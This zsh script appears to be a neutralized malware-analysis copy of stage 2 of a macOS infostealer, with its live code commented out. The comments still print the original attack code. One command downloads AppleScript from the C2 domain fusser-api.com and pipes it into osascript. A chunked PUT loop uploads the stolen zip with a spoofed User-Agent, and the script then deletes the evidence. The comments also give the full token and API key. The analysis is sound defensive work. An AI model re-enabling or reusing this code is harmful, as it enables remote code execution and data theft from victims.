#!/bin/zsh
# ============================================================================
# NEUTRALIZED — Stage 2: Background C2 Daemon & Exfiltration Engine
# ============================================================================
#
# ATTACK VECTOR: Background process that fetches + executes AppleScript from
#                C2 server, then exfiltrates stolen data in chunked uploads
# DECODED FROM: Stage 1 base64+gzip payload
# TRIGGER: eval in Stage 1
#
# WHAT IT DID:
#   1. Forked to background, redirected all I/O to /dev/null (invisible)
#   2. Downloaded a dynamic AppleScript payload from C2 and piped to osascript
#   3. Optionally passed a stolen password as query parameter
#   4. After the stealer ran, chunked-uploaded /tmp/osalogging.zip to C2
#   5. Deleted evidence after successful upload
#
# C2 INFRASTRUCTURE (DEFANGED):
#   Domain:  fusser-api[.]com           (original: fusser-api.com)
#   Token:   d0efbd68b1c2357e...c58     (victim/campaign identifier)
#   API Key: 5190ef1733183a0d...4c56d6  (authentication to C2)
#
# EXFILTRATION PROTOCOL:
#   - Endpoint: /gate?buildtxd=<token>&upload_id=<id>&chunk_index=N&total_chunks=M
#   - Method: PUT with binary body (dd chunks)
#   - Chunk size: 10 MB
#   - Max retries: 8 per chunk with exponential backoff
#   - User-Agent spoofed as Chrome on macOS
#
# STEALTH TECHNIQUES:
#   - exec </dev/null >/dev/null 2>/dev/null (no terminal output)
#   - Backgrounded with & (parent exits immediately)
#   - Spoofed User-Agent header
#   - Exponential backoff to avoid network detection
#   - Evidence cleanup (rm -f after upload)
#
# ============================================================================

daemon_function() {
    # NEUTRALIZED: Original redirected all I/O to /dev/null to hide activity
    # exec </dev/null
    # exec >/dev/null
    # exec 2>/dev/null
    echo "NEUTRALIZED: I/O redirection removed for forensic visibility"

    # DEFANGED: All C2 coordinates neutralized with [.] notation
    local domain="fusser-api[.]com"        # DEFANGED: was "fusser-api.com"
    local token="REDACTED_TOKEN"           # DEFANGED: was "d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58"
    local api_key="REDACTED_API_KEY"       # DEFANGED: was "5190ef1733183a0dc63fb623357f56d6"
    local file="/tmp/osalogging.zip"

    # NEUTRALIZED: Original fetched AppleScript from C2 and piped to osascript
    #
    # The original code below would:
    #   1. HTTP GET to http://fusser-api.com/dynamic?txd=<token>[&pwd=<password>]
    #   2. Pipe the response directly to osascript (AppleScript interpreter)
    #   3. The response was Stage 3 — a 35KB AppleScript infostealer
    #
    # if [ $# -gt 0 ]; then
    #     curl -k -s --max-time 30 \
    #         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
    #         -H "api-key: $api_key" \
    #         "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    # else
    #     curl -k -s --max-time 30 \
    #         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
    #         -H "api-key: $api_key" \
    #         "http://$domain/dynamic?txd=$token" | osascript
    # fi
    echo "NEUTRALIZED: C2 fetch + osascript execution removed"

    # NEUTRALIZED: Original uploaded stolen data in 10MB chunks
    #
    # The upload protocol:
    #   - Read /tmp/osalogging.zip (created by Stage 3)
    #   - Split into 10MB chunks using dd
    #   - PUT each chunk to http://fusser-api.com/gate with upload metadata
    #   - Retry up to 8 times per chunk with exponential backoff (3 + attempt*2 seconds)
    #   - Delete zip after successful upload
    #
    # if [[ ! -f "$file" || ! -s "$file" ]]; then
    #     return 1
    # fi
    # local CHUNK_SIZE=$((10 * 1024 * 1024))
    # local MAX_RETRIES=8
    # local upload_id=$(date +%s)-$(openssl rand -hex 8)
    # local total_size=$(stat -f %z "$file")
    # local total_chunks=$(( (total_size + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    # local i=0
    # while (( i < total_chunks )); do
    #     local offset=$((i * CHUNK_SIZE))
    #     ...
    #     http_code=$(dd if="$file" bs=1 skip=$offset count=$chunk_size 2>/dev/null | \
    #         curl -k -s -X PUT --data-binary @- \
    #         -H "api-key: $api_key" \
    #         --max-time 180 \
    #         "http://$domain/gate?buildtxd=$token&upload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks")
    #     ...
    # done
    # rm -f "$file"
    echo "NEUTRALIZED: Chunked upload exfiltration removed"

    return 0
}

# NEUTRALIZED: Original backgrounded the daemon and exited parent
# if daemon_function "$@" & then
#     exit 0
# else
#     exit 1
# fi
echo "NEUTRALIZED: Background execution removed. This script is safe for reading."
exit 0
